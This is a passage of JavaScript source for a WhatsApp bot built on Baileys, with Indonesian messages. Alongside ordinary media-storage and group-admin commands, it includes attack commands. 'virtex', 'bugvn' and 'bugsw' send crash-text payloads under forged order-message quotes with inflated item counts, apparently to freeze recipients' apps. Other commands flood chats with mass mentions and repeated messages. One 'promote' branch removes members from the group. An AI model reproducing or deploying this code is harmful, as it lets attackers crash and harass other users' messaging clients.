if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  tsukasa.sendMessage(from, `${oi1}`, MessageType.text,{quoted :mek})
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  tsukasa.sendMessage(from, teks, MessageType.text,{quoted :mek})
	  }
} else if (isQuotedSticker) {
	encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
				anu = fs.readFileSync(media)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  tsukasa.sendMessage(from, anu, sticker,{quoted :mek})
	  }
} else if (isQuotedAudio) {
	encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
				anu = fs.readFileSync(media)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  tsukasa.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', ptt:true, quoted : mek})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await tsukasa.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  tsukasa.sendMessage(from, delb, MessageType.image, {quoted : mek,caption: oi1})
	  }
}
	  break
case 'getstik':
				namastc = body.slice(9)
				try {
				result = fs.readFileSync(`./temp/stick/${namastc}.webp`)
				tsukasa.sendMessage(from, result, sticker,{quoted:ftoko})
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break			
			case 'liststik':
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				tsukasa.sendMessage(from, teks.trim(), extendedText, { quoted: ftoko, contextInfo: { "mentionedJid": setiker } })
				break				
				case 'addimg':
				if (!isQuotedImage) return reply('Reply imagenya')
				svst = body.slice(8)
				if (!svst) return reply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await tsukasa.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/foto/${svst}.jpeg`, delb)
				fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
				tsukasa.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: ftoko })
				break
			case 'getimg':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
				tsukasa.sendMessage(from, buffer, image, { quoted: ftoko, caption: `Result From Database : ${namastc}.jpeg` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				case 'listimg':
				teks = '*Image list :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*`
				tsukasa.sendMessage(from, teks.trim(), extendedText, { quoted: ftoko, contextInfo: { "mentionedJid": setiker } })
				break
				case 'addvid':
				if (!isQuotedVideo) return reply('Reply vidionya')
				svst = body.slice(8)
				if (!svst) return reply('Nama vidionya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await tsukasa.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/video/${svst}.mp4`, delb)
				fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
				tsukasa.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: ftoko })
				break			 
case 'listvid':
				teks = '*List Video :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}* `
				tsukasa.sendMessage(from, teks.trim(), extendedText, { quoted: ftoko, contextInfo: { "mentionedJid": imagenye } })
				break
			case 'getvid':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
				tsukasa.sendMessage(from, buffer, video, { quoted: ftoko,duration:'359996400' ,caption: `Result From Database : ${namastc}.mp4` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				case 'addvn':
				if (!isQuotedAudio) return reply('Reply vnnya')
				svst = body.slice(7)
				if (!svst) return reply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await tsukasa.downloadMediaMessage(boij)
				audionye.push(`${svst}`)
				fs.writeFileSync(`./temp/audio/${svst}.mp3`, delb)
				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				tsukasa.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: ftoko })
				break
case 'vn':
case 'v':
case 'getvn':
				namastc = body.slice(3)
				try {
				buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
				tsukasa.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', duration:'359996400',quoted: ftoko, ptt: true })
				} catch {
				  reply
				}
				break
				case 'listvn':
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${audionye.length}*`
				tsukasa.sendMessage(from, teks.trim(), extendedText, { quoted: ftoko, contextInfo: { "mentionedJid": audionye } })
				break 
										case 'status':
					  const chatsIds = await tsukasa.chats.all()
                const timestamp = speed();
                const latensi = speed() - timestamp 
                hmm =` \`\`\`Loaded Message\`\`\`
                
\`\`\` - [ ${totalchat.length} ]  Total Chat\`\`\`
\`\`\` - [ ROG PHONE 2 ] HANDPHONE\`\`\`
\`\`\` - [ ${tsukasa.user.phone.wa_version} ] WA Version\`\`\`
\`\`\` - [ Baileys ] Server\`\`\`
\`\`\` - [ SELF ] MODE\`\`\`
\`\`\` - [ ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / 14095 ] RAM\`\`\`

\`\`\`Speed : ${latensi.toFixed(4)} Second\`\`\``
                tsukasa.sendMessage(from, hmm, text, { quoted: ftoko})
                    break
				case 'vtagall':  
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `${virtag(prefix)}`
					for (let mem of groupMembers) {
						teks += ` 
					    @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}   @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} `
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break
				case 'clearall':
					anu = await tsukasa.chats.all()
					tsukasa.setMaxListeners(25)
					for (let _ of anu) {
						tsukasa.deleteChat(_.jid)
					}
					reply('Sukses delete all chat :)')
					break
				case 'bc': 
					if (args.length < 1) return reply('.......')
					kpd = await tsukasa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await tsukasa.downloadMediaMessage(encmedia)
						for (let _ of kpd) {
							tsukasa.sendMessage(_.jid, buff, image, {caption: `[ Broadcast ]\n\n${body.slice(4)}`})
						}
						reply('Suksess broadcast')
					} else {
						for (let _ of kpd) {
							sendMess(_.jid, `[ INI BC ]\n\n${body.slice(4)}`)
						}
						reply('Suksess broadcast')
					}
					break
                                case 'promote':
					if (!isGroup) return reply(mess.only.group) 
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Berhasil Promote\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(from, mentioned, true)
						tsukasa.groupRemove(from, mentioned)
					} else {
						mentions(`Berhasil Promote @${mentioned[0].split('@')[0]} Sebagai Admin Group!`, mentioned, true)
						tsukasa.groupMakeAdmin(from, mentioned)
					}
					break
				case 'demote':
					if (!isGroup) return reply(mess.only.group) 
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Berhasil Demote\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						tsukasa.groupRemove(from, mentioned)
					} else {
						mentions(`Berhasil Demote @${mentioned[0].split('@')[0]} Menjadi Member Group!`, mentioned, true)
						tsukasa.groupDemoteAdmin(from, mentioned)
					}
					break
				case 'add':
					if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply('Yang mau di add jin ya?')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara mas')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						tsukasa.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
                 case 'virtex':
  tsukasa.sendMessage(from, virtexbytsukasa(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})                 
  tsukasa.sendMessage(from, virtex(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
                  tsukasa.sendMessage(from, virtex2(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
                  tsukasa.sendMessage(from, virtex3(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
  tsukasa.toggleDisappearingMessages(from,`AaaaGoblok`,text)
                  tsukasa.sendMessage(from, virtex4(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
                  tsukasa.sendMessage(from, virtex5(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
 tsukasa.sendMessage(from, virtex6(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
  tsukasa.sendMessage(from, virtex7(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
  tsukasa.sendMessage(from, virtex8(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
  tsukasa.sendMessage(from, virtex9(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
   tsukasa.sendMessage(from, ngazap(prefix),extendedText, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
 break
 case 'stik':
 nicko3 = fs.readFileSync(`./temp/stick/tsukasa.webp`)
				tsukasa.sendMessage(from, nicko3,sticker,{ quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    thumbnail: virgam,
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net', 
					sendEphemeral: true,
					thumbnail: fs.readFileSync('./media/virgam.jpeg')
					
   }
  }
 }})
 tsukasa.toggleDisappearingMessages(from,`AaaaGoblok`,text)
 break
		case 'ghstalk': case 'githubstalk':
try {
if (!q) return reply('Usernamenya?')
await fetchJson(`https://api.github.com/users/${args.join(' ')}`).then(Y => {
            console.log(`githubStalker`)
           var ten = `${Y.avatar_url}`
           var teks = `*Username* : ${Y.name}\n*Blog* : ${Y.blog}\n*Location* : ${Y.location}\n*Email* : ${Y.email}\n*Bio* : ${Y.bio}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Pub-repos* : ${Y.public_repos}\n*Pub-gists* : ${Y.public_gists}\n\n*Link* : ${Y.html_url}`
            sendMediaURL(from,ten,teks) 
            }) 
} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('username tidak valid')
					}
					break
case 'bugvn':
iya2 = fs.readFileSync('./media/yamete.mp3')
tsukasa.sendMessage(from, iya2, audio, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    thumbnail: virgam,
    surface: 1,
    message: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net', sendEphemeral: true,
					thumbnail: fs.readFileSync('./media/virgam.jpeg')
   }
  }
 }, filename:`${ngazap(prefix)}`, mimetype: 'audio/mp4', duration: '359996400', ptt : true})
 break
 case 'bugsw':
 cih = fs.readFileSync(`./media/image.jpeg`)
 tsukasa.sendMessage('status@broadcast', cih, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁' ,thumbnail: virgam})
 tsukasa.sendMessage('status@broadcast', cih, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁' ,thumbnail: virgam})
 tsukasa.sendMessage('status@broadcast', cih, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁' ,thumbnail: virgam})
 tsukasa.sendMessage('status@broadcast', cih, image, { caption: '𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨹𐨸𐨸𐨸𐨸𐨁𐨁𐨁𐨁𐨁𐨁𐨅𐨆𐨆𐨆𐨆𐨅𐨆𐨅𐨂𐨁𐨆𐨁𐨅𐨂𐨅𐨂𐨆𐨅𐨁𐨂𐨂𐨂𐨂𐨂𐨂𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨁𐨅𐨁𐨆𐨂𐨆𐨆𐨆𐨆𐨆𐨆𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨅𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨁𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨆𐨠 ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁' ,thumbnail: virgam})
